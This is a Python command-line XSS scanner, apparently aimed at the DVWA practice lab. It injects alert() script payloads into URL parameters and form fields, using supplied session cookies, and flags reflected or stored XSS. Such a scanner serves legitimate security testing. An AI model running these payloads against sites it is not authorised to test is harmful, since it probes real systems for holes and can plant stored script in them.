import sys
import json
import requests
import re
import argparse
import time
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

class AdvancedXSSScanner:
    def __init__(self, target_url, custom_params=None, cookies=None):
        self.target_url = target_url
        self.custom_params = custom_params or []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Handle cookies for authentication
        if cookies:
            for cookie in cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    self.session.cookies.set(name, value)
        
        # Basic XSS payloads
        self.advanced_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
        ]
        
        self.results = []

    def scan_url_parameters(self):
        """Scan URL parameters - only if they exist"""
        parsed_url = urlparse(self.target_url)
        params = parse_qs(parsed_url.query)
        
        if self.custom_params:
            print(f"[INFO] Testing custom URL parameters: {self.custom_params}", file=sys.stderr)
            for param in self.custom_params:
                self.test_parameter(param, 'test_value')
        elif params:
            print(f"[INFO] Testing existing URL parameters: {list(params.keys())}", file=sys.stderr)
            for param_name, param_values in params.items():
                self.test_parameter(param_name, param_values[0] if param_values else 'test')
        else:
            print("[INFO] No URL parameters found, skipping URL parameter tests", file=sys.stderr)

    def test_parameter(self, param_name, original_value):
        """Test a single URL parameter for XSS vulnerabilities"""
        base_url = self.target_url.split('?')[0]
        
        for payload in self.advanced_payloads:
            try:
                test_url = f"{base_url}?{param_name}={payload}"
                response = self.session.get(test_url, timeout=10, allow_redirects=False)
                
                # Check if we got redirected to login
                if response.status_code == 302 and 'login' in response.headers.get('Location', '').lower():
                    print(f"[WARNING] Redirected to login page. Session may have expired.", file=sys.stderr)
                    continue
                
                vulnerable = self.detect_xss_in_response(response.text, payload)
                
                self.results.append({
                    'payload': payload,
                    'vulnerable': vulnerable,
                    'method': 'url_parameter',
                    'parameter': param_name,
                    'url': test_url,
                    'confidence': 85 if vulnerable else 0,
                    'severity': 'high' if vulnerable else None
                })
                
            except Exception as e:
                self.results.append({
                    'payload': payload,
                    'vulnerable': False,
                    'error': str(e),
                    'method': 'url_parameter',
                    'parameter': param_name
                })

    def scan_forms(self):
        """Scan forms in the page"""
        try:
            response = self.session.get(self.target_url, timeout=10, allow_redirects=True)
            
            # Check if we're on a login page
            if 'login' in response.url.lower() and 'login' not in self.target_url.lower():
                print(f"[ERROR] Redirected to login page. Please ensure you're logged in.", file=sys.stderr)
                return
            
            soup = BeautifulSoup(response.content, 'html.parser')
            forms = soup.find_all('form')
            
            print(f"[INFO] Found {len(forms)} forms on the page", file=sys.stderr)
            
            for idx, form in enumerate(forms):
                action = form.get('action', '')
                method = form.get('method', 'get').lower()
                
                # Handle form action
                if not action or action == '' or action == '#':
                    # Submit to same page
                    form_url = self.target_url.split('?')[0]
                else:
                    # Resolve relative URLs
                    form_url = urljoin(self.target_url, action)
                
                print(f"[INFO] Form {idx+1}: method={method}, action='{action}' => '{form_url}'", file=sys.stderr)
                
                # Get form fields
                inputs = form.find_all(['input', 'textarea', 'select'])
                form_data = {}
                testable_fields = []
                
                for input_field in inputs:
                    name = input_field.get('name')
                    if not name:
                        continue
                    
                    input_type = input_field.get('type', 'text')
                    
                    if input_type == 'submit':
                        form_data[name] = input_field.get('value', 'Submit')
                    elif input_type == 'hidden':
                        form_data[name] = input_field.get('value', '')
                    elif input_type not in ['button', 'reset']:
                        form_data[name] = 'test'
                        testable_fields.append(name)
                
                if testable_fields:
                    print(f"[INFO] Form has testable fields: {testable_fields}", file=sys.stderr)
                    self.test_form(form_url, method, form_data, testable_fields)
                    
        except Exception as e:
            print(f"[ERROR] Form scan failed: {str(e)}", file=sys.stderr)

    def test_form(self, form_url, method, form_data, testable_fields):
        """Test form fields for XSS vulnerabilities"""
        is_stored_xss = 'xss_s' in self.target_url or 'stored' in self.target_url
        
        for field_name in testable_fields:
            for payload in self.advanced_payloads:
                test_data = form_data.copy()
                
                # Create unique payload for tracking
                unique_id = f"XSS_{int(time.time())}_{hash(payload) % 10000}"
                tagged_payload = payload.replace('XSS', unique_id)
                test_data[field_name] = tagged_payload
                
                # Fill other fields with safe values
                for other_field in testable_fields:
                    if other_field != field_name:
                        test_data[other_field] = f"Test_{other_field}"
                
                try:
                    print(f"[DEBUG] Testing field '{field_name}' with {method.upper()} to {form_url}", file=sys.stderr)
                    
                    # Submit form
                    if method == 'post':
                        response = self.session.post(form_url, data=test_data, timeout=10, allow_redirects=True)
                    else:
                        response = self.session.get(form_url, params=test_data, timeout=10, allow_redirects=True)
                    
                    # Check immediate response
                    vulnerable = self.detect_xss_in_response(response.text, tagged_payload)
                    detected_method = f'form_{method}'
                    
                    # Check for stored XSS
                    if not vulnerable and is_stored_xss:
                        time.sleep(1)
                        check_response = self.session.get(self.target_url, timeout=10)
                        if self.detect_xss_in_response(check_response.text, tagged_payload):
                            vulnerable = True
                            detected_method = 'stored'
                            print(f"[FOUND] Stored XSS vulnerability in field '{field_name}'!", file=sys.stderr)
                    
                    self.results.append({
                        'payload': tagged_payload,
                        'vulnerable': vulnerable,
                        'method': detected_method,
                        'field': field_name,
                        'url': self.target_url if detected_method == 'stored' else form_url,
                        'confidence': 95 if detected_method == 'stored' else 90 if vulnerable else 0,
                        'severity': 'critical' if detected_method == 'stored' else 'high' if vulnerable else None
                    })
                    
                except Exception as e:
                    print(f"[ERROR] Failed testing field '{field_name}': {str(e)}", file=sys.stderr)
                    self.results.append({
                        'payload': tagged_payload,
                        'vulnerable': False,
                        'method': f'form_{method}',
                        'field': field_name,
                        'error': str(e)
                    })

    def detect_xss_in_response(self, response_text, payload):
        """Check if XSS payload is reflected in response"""
        # Direct match
        if payload in response_text:
            return True
        
        # Check for unique IDs (stored XSS)
        if 'XSS_' in payload:
            match = re.search(r'XSS_\d+_\d+', payload)
            if match and match.group() in response_text:
                return True
        
        # Check for script execution patterns
        if 'alert' in payload and 'alert' in response_text:
            if re.search(r'<script[^>]*>.*?alert.*?</script>', response_text, re.IGNORECASE | re.DOTALL):
                return True
        
        return False

    def run_scan(self):
        """Run complete XSS scan"""
        try:
            print(f"[INFO] Starting XSS scan for: {self.target_url}", file=sys.stderr)
            
            # Check if we can access the target
            test_response = self.session.get(self.target_url, timeout=10, allow_redirects=True)
            if 'login' in test_response.url.lower() and 'login' not in self.target_url.lower():
                print(f"[ERROR] Target URL redirects to login. Please provide valid session cookies.", file=sys.stderr)
                print(f"[ERROR] Use: --cookies 'PHPSESSID=your_session_id; security=low'", file=sys.stderr)
                return []
            
            # 1. URL parameter scan
            self.scan_url_parameters()
            
            # 2. Form scan
            self.scan_forms()
            
            print(f"[INFO] Scan completed. Total tests: {len(self.results)}", file=sys.stderr)
            
        except Exception as e:
            print(f"[ERROR] Scan failed: {str(e)}", file=sys.stderr)
        
        return self.results

def main():
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--params', help='Comma-separated list of parameters', default='')
    parser.add_argument('--cookies', help='Cookies for authentication (e.g., "PHPSESSID=abc123; security=low")', default='')
    
    args = parser.parse_args()
    
    custom_params = []
    if args.params:
        custom_params = [p.strip() for p in args.params.split(',') if p.strip()]
    
    scanner = AdvancedXSSScanner(args.url, custom_params, args.cookies)
    results = scanner.run_scan()
    
    print(json.dumps(results, indent=2))

if __name__ == "__main__":
    main()